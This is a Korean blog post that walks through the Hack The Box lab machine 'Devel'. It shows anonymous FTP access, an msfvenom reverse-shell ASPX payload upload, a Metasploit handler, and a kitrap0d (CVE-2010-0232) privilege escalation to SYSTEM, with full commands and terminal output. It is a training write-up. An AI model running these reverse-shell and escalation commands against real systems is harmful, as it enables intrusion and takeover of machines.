---
layout: post
title: "hack the box-devel"
featured-img: hack_the_box
category: Etc
summary: anonymous FTP, msfvenom, metasploit

---

# list 
---

- Service Enumeration
  + [ftp](#FTP) 
- metasploit
  + [msfvenom](#msfvenom)
  + [exploit_handler](#exploit_handler)
  + [exploit_local_exploit_suggester](#exploit_local_exploit_suggester)
  + [Privilege_Escalation](#Privilege_Escalation)

# 0. Intro

`devel` 문제는 취약하게 설정되어 있는 anonymous FTP를 통해 shell을 업로드하고 windows 취약점을 이용하여 Privilege Escalation 하는 방법으로 해결할 수 있습니다.

이번 포스팅에서는 ftp, msfvenom, metasploit를 이용한 공격을 정리하겠습니다.

<a name="FTP"/>

# 1. FTP
---

nmap을 이용하여 스캔한 결과는 다음과 같습니다. 

```no-highlight
# Nmap 7.70 scan initiated Mon Jun  3 00:26:04 2019 as: nmap -sC -sV -oA nmap-script 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.28s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

anonymous FTP는 계정을 가지고 있지 않은 사용자도 데이터에 접근할 수 있도록 FTP 서버가 설정 되어있는 것을 의미합니다.
ID는 anonymous, PW는 아무거나 입력 후 FTP에 접속할 수 있습니다.

<script id="asciicast-0BOKAfXz7mYilcvBpVUWpDLAK" 
        src="https://asciinema.org/a/0BOKAfXz7mYilcvBpVUWpDLAK.js" 
        async data-autoplay="true" data-size="small" >
</script>

<details>
<summary>terminal fold</summary>
<div markdown="1">

```console
root@kali:~/Desktop/htb/devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
</div>
</details>
<br>
anonymous 접근을 허용한 FTP 서버에 적절한 권한 설정을 하지 않는다면 FTP 업로드 기능을 이용하여 SHELL을 올리는 등 다양한 공격이 가능합니다.

### Referrence
[FTP 서버를 안전하게 관리하기 위한 보안 방안](https://www.boannews.com/media/view.asp?idx=39031)

<a name="msfvenom"/>
# 2. MsfVenom
---
Metasploit의 payload를 MsfVenom를 사용하여 별도의 파일으로 생성할 수 있습니다.<br>
Metasploit에서는 다양한 종류의 payloads, platforms, architecture, format을 지원하고 쉽게 payload를 생성할 수 있다는 장점이 있습니다.

MsfVenom을 이용하여 10.10.14.5:4444에 reverse connection을 수행하는 shell.aspx 파일을 생성하고, 취약하게 설정되어 있는 anonymous FTP에 업로드 합니다.

<script id="asciicast-2feAxBL7SYSPYxJf6DFBEdjRc" 
        src="https://asciinema.org/a/2feAxBL7SYSPYxJf6DFBEdjRc.js"
        async data-autoplay="true" data-size="small" >
</script>

<details>
<summary>terminal fold</summary>
<div markdown="1">

```console
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

</div>
</details>
<br>

# 3. metasploit
---

<a name="exploit_handler"/>

## 3.1 handler module
---
shell.aspx 실행시켰을 때 handler와 연결시킵니다.<br>
이때 생성되는 session을 이용해서 추가적인 공격을 진행할 수 있습니다.

<script id="asciicast-UsyVwKLVHf2q18Vt6gHtmJIdy" 
        src="https://asciinema.org/a/UsyVwKLVHf2q18Vt6gHtmJIdy.js" 
        async data-autoplay="true" data-size="small" >
</script>

<details>
<summary>terminal fold</summary>
<div markdown="1">

```console
root@kali:~/Desktop/htb/devel# msfconsole
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.5
LHOST => 10.10.14.5
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.5:49158) at 2019-06-04 22:42:06 -0400

meterpreter > shell
Process 1580 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

</div>
</details>

<br>

위의 명령어 같이 세션을 연결하기 위해 핸들러를 다루는 일은 반복적으로 사용하게 됩니다.<br>
이런 명령어들은 다음과 같이 스크립트 형식으로 작성하여 실행시킬 수 있습니다.

```console
root@kali:~/Desktop/htb/devel# cat resource.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
exploit -j -z
root@kali:~/Desktop/htb/devel# msfconsole -r resource.rc
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file
...
```


<a name="exploit_local_exploit_suggester"/>

## 3.2 local exploit suggester module
---
local exploit suggester module은 대상서버의 architecture, platform 정보를 통해서 사용가능한 exploit을 나열해줍니다.
**3.1 handler module**을 통해 획득한 session을 연결시켜 공격을 진행할 수 있습니다.

<script id="asciicast-vkasZ1rW9W1vQzdCWczAwqIQS"
        src="https://asciinema.org/a/vkasZ1rW9W1vQzdCWczAwqIQS.js"
        async data-autoplay="true" data-size="small" >
</script>

<details>
<summary>terminal fold</summary>
<div markdown="1">

```console
msf5 exploit(multi/handler) > sessions -l

Active sessions
  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.5:4444 -> 10.10.10.5:49171 (10.10.10.5)


msf5 exploit(multi/handler) > back
msf5 > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > show options
       
Module options (post/multi/recon/local_exploit_suggester):
              
   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1                                                       
msf5 post(multi/recon/local_exploit_suggester) > run  

[*] 10.10.10.5 - Collecting local exploits for x86/windows...       
[*] 10.10.10.5 - 29 exploit checks are being tried...          
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
...
```
</div>
</details>
<br>

<a name="Privilege_Escalation"/>

## 3.3 Privilege Escalation
---
local_exploit_suggester를 사용하여 얻은 정보(**exploit/windows/local/ms10_015_kitrap0d**)를 이용하여 exploit을 진행합니다.

**ms10_015_kitrap0d** 취약점은 윈도우 커널 취약점으로 **CVE-2010-0232** 로 지정되어 있습니다.<br>
해당 취약점은 커널이 적절하게 예외처리를 하지 않아 발생하고, **공격에 성공하면 커널 모드에서 임의의 코드를 실행**할 수 있습니다. 
<script id="asciicast-Ay8VGouqxwWysygBL0YTg8sYX" 
        src="https://asciinema.org/a/Ay8VGouqxwWysygBL0YTg8sYX.js"        
        async data-autoplay="true" data-size="small" >
</script>

<details>
<summary>terminal fold</summary>
<div markdown="1">

```console
msf5 > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > show options                        
                                                  
Module options (exploit/windows/local/ms10_015_kitrap0d):  

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Exploit target:
   Id  Name                                    
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 1
msf5 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

Exploit target:
   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 192.168.87.138:4444
[*] Launching notepad to host the exploit...
[+] Process 1164 launched.
[*] Reflectively injecting the exploit DLL into 1164...
[*] Injecting exploit into 1164 ...
[*] Exploit injected. Injecting payload into 1164...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.

msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.5                                     
LHOST => 10.10.14.5                                                                                      
msf5 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 4445                                           
LPORT => 4445                                                                                            
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.5:4445
[*] Launching notepad to host the exploit...
[+] Process 2964 launched.
[*] Reflectively injecting the exploit DLL into 2964...
[*] Injecting exploit into 2964 ...
[*] Exploit injected. Injecting payload into 2964...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.5:4445 -> 10.10.10.5:49162) at 2019-06-05 02:51:09 -0400

meterpreter > shell
whoProcess 3232 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```

</div>
</details>
<br>

## Referrence
---
[IppSec Devel](https://www.youtube.com/watch?v=2LNyAbroZUk)


